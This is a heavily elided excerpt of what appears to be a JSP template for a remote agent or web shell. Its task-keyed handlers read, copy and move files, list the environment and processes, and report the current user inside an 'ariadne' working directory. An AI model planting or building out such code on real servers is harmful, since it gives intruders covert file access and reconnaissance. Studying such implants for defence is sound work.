...
<%!
    ...
    [% if 'cat' in commands %]
    static String cmdCat(String taskId, String filepath) {
        try {
            File f;
            if (new File(filepath).isAbsolute()) {
                f = new File(filepath);
            ...
            String contents = new String(java.nio.file.Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8);
    ...
    static String cmdMkdir(String taskId, String path) {
        try {
            File dir;
            if (new File(path).isAbsolute()) {
                dir = new File(path);
    ...
    [% if 'cp' in commands %]
    static String cmdCp(String taskId, String src, String dst) {
        try {
            File srcFile;
            if (new File(src).isAbsolute()) {
                srcFile = new File(src);
            } else {
                srcFile = new File(ariadneWorkDir, src);
            }

            File dstFile;
            if (new File(dst).isAbsolute()) {
                dstFile = new File(dst);
            } else {
                dstFile = new File(ariadneWorkDir, dst);
            }
    ...
    static void copyDirRecursive(File src, File dst) throws Exception {
        if (!dst.exists()) {
            dst.mkdirs();
        }
        ...
        if (entries != null) {
            for (File entry : entries) {
                ...
                if (entry.isDirectory()) {
                    ...
                    java.nio.file.Files.copy(entry.toPath(), destEntry.toPath(),
                        java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                }
            }
        }
    ...
    [% if 'mv' in commands %]
    static String cmdMv(String taskId, String src, String dst) {
        try {
            File srcFile;
            if (new File(src).isAbsolute()) {
                srcFile = new File(src);
            ...
            java.nio.file.Files.move(srcFile.toPath(), dstFile.toPath(),
                java.nio.file.StandardCopyOption.REPLACE_EXISTING);
    ...
    [% if 'env' in commands %]
    static String cmdEnv(String taskId) {
        try {
    ...
    static String cmdWhoami(String taskId) {
        try {
            StringBuilder sb = new StringBuilder();
            ...
            try {
                ...
                // Could not run external command, basic info only
            }
    ...
    [% if 'ps' in commands %]
    static String cmdPs(String taskId) {
        try {
            ...
            try {
                ...
                // ProcessHandle not available, fall back to external command
            }
